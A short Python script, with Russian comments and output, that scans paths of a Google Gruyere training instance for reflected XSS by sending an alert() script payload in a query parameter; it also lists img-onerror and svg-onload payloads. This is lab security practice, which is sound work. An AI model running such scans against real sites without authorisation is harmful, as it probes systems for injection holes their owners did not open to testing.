#!/usr/bin/env python3
"""
Тест XSS на всех найденных путях
"""

import requests
import os
from dotenv import load_dotenv

load_dotenv()
MY_ID = os.getenv("MY_ID")
BASE_URL = f"https://google-gruyere.appspot.com/{MY_ID}"

# Все пути, которые вернули 200
PATHS = [
    "/", "/home", "/index", "/main", "/search",
    "/snippets", "/snippets/", "/snippet", "/new", "/create",
    "/upload", "/upload/", "/profile", "/user", "/account",
    "/login", "/signup", "/register", "/logout", "/admin",
    "/admin/", "/settings", "/config", "/about", "/contact",
    "/help", "/api", "/api/", "/test", "/debug"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
]

def quick_xss_test():
    """Быстрый тест XSS на всех путях"""
    print("🎯 БЫСТРЫЙ ТЕСТ XSS НА ВСЕХ ПУТЯХ")
    print("=" * 50)
    
    found_vulnerabilities = []
    
    for path in PATHS[:10]:  # Тестируем первые 10 путей
        url = BASE_URL + path
        
        print(f"\n🔍 {path}")
        
        # Тест 1: Просто с параметром q
        test_url = f"{url}?q={requests.utils.quote(XSS_PAYLOADS[0])}"
        try:
            response = requests.get(test_url, timeout=3)
            
            if XSS_PAYLOADS[0] in response.text:
                print(f"  ✅ XSS НАЙДЕН! Путь: {path}")
                print(f"     URL: {test_url}")
                found_vulnerabilities.append({
                    'path': path,
                    'url': test_url,
                    'payload': XSS_PAYLOADS[0]
                })
            elif response.status_code == 200:
                print(f"  ⚠️  Код 200, но payload не отразился")
            else:
                print(f"  ❌ Код: {response.status_code}")
                
        except Exception as e:
            print(f"  ❌ Ошибка: {e}")
    
    # Вывод результатов
    print("\n" + "=" * 50)
    print("📊 РЕЗУЛЬТАТЫ:")
    print("=" * 50)
    
    if found_vulnerabilities:
        print(f"✅ Найдено {len(found_vulnerabilities)} потенциальных XSS:")
        for vuln in found_vulnerabilities:
            print(f"   • {vuln['path']}: {vuln['payload'][:20]}...")
    else:
        print("❌ XSS не найден в URL параметрах")
        print("\n🔍 СЛЕДУЮЩИЙ ШАГ: Тестируйте формы на страницах!")

if __name__ == "__main__":
    quick_xss_test()